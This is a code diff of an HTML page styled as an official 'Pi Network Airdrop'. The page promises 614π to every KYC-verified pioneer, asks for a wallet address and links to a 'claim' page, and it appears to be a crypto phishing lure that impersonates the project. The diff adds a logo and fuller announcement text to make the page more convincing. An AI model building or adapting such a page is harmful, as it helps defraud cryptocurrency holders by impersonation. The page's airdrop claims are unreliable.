@@ -4,22 +4,29 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pi Network Airdrop</title>
-    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
     <header>
+        <img src="logo.png" alt="Pi Network Logo" class="logo">
         <h1>Pi Network</h1>
     </header>
 
     <main>
-        <section class="intro">
-            <h2>Pi Network Airdrop</h2>
-            <p>To claim your 614π, enter your wallet address below:</p>
-            <form action="third-page.html" method="POST">
-                <input type="text" name="walletAddress" placeholder="Enter your wallet address" required>
-                <button type="submit" class="button">Claim 614 PI</button>
+        <div class="content">
+            <h2>Pi Network First Airdrop</h2>
+            <p>
+                The official Pi Network has reached 2 million pioneers! 
+                To get closer to the mainnet and activate and attract more pioneers, 
+                they will be holding an airdrop, awarding a total of 614π/pioneer 
+                prizes to those who successfully complete KYC. The future looks very 
+                exciting as the Pi community continues to build the Web3 Pi ecosystem.
+            </p>
+            <form id="walletForm">
+                <input type="text" id="walletAddress" name="walletAddress" placeholder="Enter your wallet address" required>
             </form>
-        </section>
+        </div>
+        <a href="third-page.html" class="claim-button">CLAIM 614 PI NETWORK COINS</a>
     </main>
 </body>
 </html>
